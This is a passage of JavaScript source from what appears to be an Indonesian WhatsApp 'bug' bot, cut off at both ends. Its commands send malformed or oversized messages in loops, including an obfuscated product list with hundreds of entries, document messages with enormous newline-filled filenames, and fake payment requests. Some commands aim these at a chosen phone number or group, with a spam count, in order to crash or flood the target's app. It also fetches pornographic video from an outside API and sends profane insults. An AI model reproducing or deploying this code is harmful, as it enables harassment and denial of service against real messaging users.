var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"groupName": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"caption": `🔥 ${teks} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
case 'jadibugpayment' : {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © banghw`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:doc})
}
}
break
case 'jadibugbokep': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `🔥 ${teks} ${bugsw}` }, { quoted: doc })
}
}
break
case 'jadibugsw': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
joau = fs.readFileSync('./baseikal/video/haikal.mp4')
haikal.sendMessage(m.chat, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted: doc })
}
}
break
case 'jadibugbutton':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
const buttonssk = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonnnnmMessage = {
text: `🔥 ${teks} ${bugsw}`,
footerText: '🔥 ${teks} ',
buttons: buttonssk,
headerType: 1
}
haikal.sendMessage(m.chat, buttonnnnmMessage)
}
 break
//=================================================//
case 'inibug': case 'banghwjhon': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
}
break
//=================================================//
case 'aduhcoy':
if (isBan) throw sticBanLu(from)
if (!isCreator) return
touchmebre = [
{
title: `🌷 HW MODS WA 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
haikal.sendListMsg(m.chat, `🌷 HW MODS WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
break
case 'banghwpoll': case 'banghwjhon2': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT banghw",
"options": [
{
"optionName": "KATANYA WA KEBAL"
},
{
"optionName": "BERANI VOTE GA"
},
{
"optionName": "VOTE LAH SEMUA"
},
{
"optionName": "KATANYA KEBAL"
},
{
"optionName": "SALAM BROTHER BY © banghw"
}
],
"selectableOptionsCount": 5
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('sukses sendbug')}
}
break
//=================================================//
case 'banghwtroli2': case 'banghwtrol': case 'jutrol': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY © banghw",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
case 'banghwtroli3': case 'banghwtrol2': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','HW\x20MODS\x20WA','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt','6281214281312@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await haikal[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var order=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+buttonkal,'description':_0x588892(0x1fc)+buttonkal,'thumbnail':virgam,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+buttonkal}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});haikal['relayMessage'](m[_0x588892(0x1f3)],order['message'],{'messageId':order['key']['id']});
}
}
break
//=================================================//
case 'banghwsantet': {
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER © banghw`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//=================================================//
case 'banghwsantetgc': case 'santetbro': {
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER © banghw`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//=================================================//
case 'ducu': case 'banghwducu': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© banghwAPIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
//=================================================//
case 'banghwdaca': case 'banghwdaca':  {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
 haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© banghwAPIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwdocu': case 'banghwdraknes':  {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ☆DARKNESS⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'duc': case 'banghwslebew': case 'cumadocu': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
